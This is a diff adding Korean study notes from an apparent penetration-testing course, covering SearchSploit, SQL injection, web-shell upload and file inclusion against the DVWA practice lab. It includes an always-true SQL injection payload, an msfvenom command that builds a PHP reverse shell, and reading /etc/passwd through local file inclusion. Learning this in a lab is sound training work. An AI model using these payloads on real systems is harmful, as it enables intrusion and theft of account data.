@@ -1,0 +1,131 @@
+# CLASS101 chap-3
+
+⇒ 취약점을 찾는 단계
+
+→ 서비스분석 단계
+
+: 정보수집단계에서 얻은 정보를 통해 취약점을 찾는 단계
+
+⇒ 가장 중요한 정보 : 서비스와 관련된 정보 ex) 웹 서비스
+
+- SearchSploit
+    
+    SearchSploit [서비스] [버전]
+    
+    → 해당 버전을 가지는 서비스의 취약점을 확인 가능
+    
+    → 코드 또는 경로
+    
+    가장 얻으면 좋은 취약점
+    
+    : 원격 실행 코드 취약점 (Remote Code Execution)
+    
+    ⇒ 해당 서비스에서 내가 원하는 명령을 실행시켜주게 하는 코드
+    
+    find를 통해 코드 및 파일 확인 가능
+    
+    ※ 구글에 [서비스] [버전] exploit 검색을 통해서도 취약점 확인 가능
+    
+- SQL Injection
+    
+    웹 해킹의 꽃
+    
+    union SQL Injection
+    
+    Blind SQL Injection
+    
+    Error Base SQL Injection
+    
+    Time Base SQL Injection
+    
+    Web Server : 웹 서버
+    
+    DB Server : 데이터베이스 서버
+    
+    ※ 데이터베이스 : 사용자 데이터, 웹 구동을 위한 데이터들을 저장하고 보관
+    
+    Web Server와 DB Server는 한 컴퓨터에서 다 실행이 가능하고, 각 컴퓨터로도 실행 가능
+    
+    ex) DVWA는 두 개가 한 컴퓨터에서 실행되는 구조
+    
+    Web Server는 DB Server에 멍령을 내릴 줄 알아야 함 ⇒ SQL
+    
+    ex) select * from member where id=’johnleesae’
+    
+    select : DB에서 데이터를 가져올 때 사용하는 명령어
+    
+    from member : member 라는 테이블에서
+    
+    id=’johnleesae’ : 조건문 → 입력값을 받는 위치
+    
+    ⇒ SQL Injection은 조건문 즉, 입력값을 받는 위치에 값을 넣어 원하는 결과를 얻는 것
+    
+    ex) select * from member where id=1’ or ‘1’=’1
+    
+    → 1’ or ‘1’=’1 : 싱글 쿼터 ‘’를 이용한 SQL Injection
+    
+    or 라는 명제를 통해 조건문을 항상 참으로 만들어
+    
+    모든 대상을 대상으로 지정함
+    
+- Web Shell
+    
+    Upload
+    
+    웹에 업로드할 파일 만들기
+    
+    <?php
+    
+    echo ‘HELLO PHP’;
+    
+    ?>
+    
+    파일 생성 후 DVWA에 업로드 하고 경로를 들어가면 HELLO PHP만 출력됨
+    
+    <?php 와 ?> echo 등은 출력되지 않음
+    
+    why?  ⇒ 웹에서 해당 파일을 실행시키는 것을 확인 가능
+    
+    ⇒ 핵심은 실행 파일을 인지하고 서버가 파일을 실행하고 응답해주는 것
+    
+    이를 활용하여 악성 스크립트가 담긴 파일을 업로드 하기
+    
+    → msfvenom -p php/reverse_php LHOST=[내 아이피] LPORT=[포트번호] -f raw > shall.php
+    
+    -p : 악성 페이로드
+    
+    php/reverse_php : 악성 페이로드를 사용할건데 reverse_php를 사용함
+    
+                             reverse_php ⇒ reverse shell이 포함된 php 파일
+    
+    LHOST : Listening Host
+    
+    -f raw : 출력 방식은 raw
+    
+    만든 파일 업로드 후 경로 진입
+    
+    쉘은 진입할 수 있지만, 최고 권한인 root가 아님
+    
+- LFI, RFI
+    
+    File Inclusion
+    
+    웹 페이지에는 File Include라는 기능이 있음
+    
+    File Include ⇒ 페이지가 변해도 버튼, 상단 등 계속 동일하게 존재하는 기능들을 페이지마다 새
+    
+                      로 만들기엔 비 효율적
+    
+    따라서, 버튼 상단 등 계속 동일하게 존재하는 기능을 따로 만들고, Include하여 동작하게 하는 것 → 새로 계속 만들지않아 매우 효율적이지만, 공격자 입장에선 매우 취약적임
+    
+    File Include는 한문, 영문 페이지에서 특히 자주 사용함
+    
+    DVWA FIle Inclusion에서 주소창에 /etc/passwd 입력 시, 계정 정보들이 출력됨
+    
+    ⇒ LFI : Local File Inclusion 이라고 함
+    
+    RFI : Remote File Inclusion
+    
+    내가 웹 서비스를 열어 해당 웹으로 접속하게 해 쉘에 접근하는 방식
+    
+    악성 페이로드를 내 웹 사이트에 심어두고 해당 경로로 접근하게 만들기
